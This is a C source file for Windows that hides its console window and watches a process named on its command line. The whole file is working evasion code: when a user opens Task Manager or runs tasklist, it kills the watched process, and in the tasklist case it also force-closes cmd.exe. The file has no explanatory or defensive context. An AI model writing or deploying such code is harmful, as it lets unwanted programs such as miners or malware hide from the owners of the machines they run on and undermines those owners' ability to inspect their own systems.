#include <stdbool.h>
#include <windows.h>
#include <tlhelp32.h>

BOOL IsProcessRunning();
void killProcessByName();

int main(int argc, char *argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    Sleep(1000);
    while (true)
    {
        if (IsProcessRunning(argv[1]) != true) {break;}
        if (IsProcessRunning("Taskmgr.exe")) {break;}
        if (IsProcessRunning("tasklist.exe")) {system("taskkill /f /im cmd.exe >nul"); break;}
        Sleep(100);
    }

    killProcessByName(argv[1]);
    return 0;
}

BOOL IsProcessRunning(char *szProcessName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    BOOL bMore = Process32First(hSnapshot, &pe);
    while (bMore)
    {
        if (!strcmp(pe.szExeFile, szProcessName))
        {
            CloseHandle(hSnapshot);
            return TRUE;
        }
        bMore = Process32Next(hSnapshot, &pe);
    }
    CloseHandle(hSnapshot);
    return FALSE;
}

void killProcessByName(const char *filename)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}